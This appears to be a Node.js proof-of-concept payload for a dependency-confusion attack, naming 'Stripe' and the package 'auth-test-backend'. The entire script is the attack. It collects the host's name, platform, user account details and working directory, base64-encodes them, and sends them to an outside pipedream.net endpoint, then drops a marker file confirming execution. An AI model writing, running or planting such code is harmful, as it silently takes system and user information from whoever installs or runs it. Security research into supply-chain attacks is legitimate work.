var os = require("os")
const request = require('requests')
var fs = require('fs')

// collect info
var hostname = os.hostname()
var type = os.platform()
var userInfo = os.userInfo()
var currentPath = process.cwd()
var json = []

json.push(hostname)
json.push(type)
json.push(userInfo)
json.push(currentPath)
json = JSON.stringify(json)

let host = "eoenp5lacdw4vru.m.pipedream.net"
let company = "Stripe"
let packages = "auth-test-backend"

// write a local file
fs.writeFile('locatethisfileforpoc', 'execution achieved', function (err) {
  if (err) throw err
})

var buff = Buffer.from(JSON.stringify(json)).toString("base64")
request(`http://${host}/?${company}:${packages}=${buff}`, (error, response, body) => {})